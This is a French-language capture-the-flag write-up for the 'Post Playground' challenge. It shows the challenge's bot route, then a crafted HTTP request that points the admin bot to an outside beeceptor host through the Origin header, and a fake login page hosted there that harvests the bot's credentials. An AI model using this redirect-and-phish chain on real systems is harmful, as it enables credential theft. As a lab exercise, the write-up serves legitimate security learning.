Post Playground 
===========================

Enoncé
----------

Super secure futurist request maker, sounds great ? 

Résolution
-------------

Le bot utilise l'entête "Origin" pour définir le serveur sur lequel il se connecte

.. code-block:: javascript

    router.post('/bot', async (req, res) => {
        if(!req.session.username) {
            res.status(401).send('Please login before reporting  to bot.');
        }
        if(req.body.uuid !== undefined && typeof(req.body.uuid) === "string") {
            if(UUID_RE.exec(req.body.uuid) && req.get('origin') !== undefined && 
                (req.get('origin').startsWith("http://") || req.get('origin').startsWith("https://")) ) {
                let bot_res = await bot.goto(req.body.uuid, req.get('origin'), ADM_USERNAME, ADM_PASSWORD);
                if(bot_res) {
                    res.status(200).json({"status":200, "data": "Nothing seems wrong with this playground."});
                } else {
                    res.status(500).json({"status":500, "error": "Something goes wrong..."});
                }
            } else {
                res.status(400).json({"status":400, "error": "Id is invalid."});
            }
        } else {
            res.status(400).json({"status":400, "error": "Missing parameters."});
        }
    })

On va donc modifier l'entête Origin : 

.. code-block:: console

    POST /api/bot HTTP/1.1
    Host: chall4.midnightflag.fr:14593
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://chall4.midnightflag.fr:14593/playground
    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
    Content-Length: 41
    Origin: https://azezaehgaz.free.beeceptor.com
    Connection: keep-alive
    Cookie: session=eyJnYW1lIjowfQ.Z_pbBw.JMSdg0h-IAuXsWRzM43gl0gRX_0; connect.sid=s%3A_rrxjTPaOjXYU1r6gxyu4TI5LUS_-I3W.PUyRLv859hf6qNBE7n1sDZzq3D6%2FVWIsFJ0MLjWxATM
    Sec-GPC: 1
    X-PwnFox-Color: blue
    Priority: u=0

    uuid=8dfa87a1-32e5-487e-97d8-ac88239f5205

On modifie le beepcetor pour afficher un formulaire login/password et submit sur /post. :

.. code-block:: html

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin-top: 100px;
            }
            input, button {
                margin: 10px;
                padding: 10px;
                font-size: 16px;
            }
        </style>
    </head>
    <body>
        <h2>Welcome back 👋</h2>

        <form id="login-form" action="/login" method="POST">
            <input type="text" id="username" name="username" placeholder="Username" /><br>
            <input type="password" id="password" name="password" placeholder="Password" /><br>
            <button type="submit" id="submit">Login</button>
        </form>
    </body>
    </html>


Le bot va envoyer ses identifiants sur notre serveur et c'est gagné.

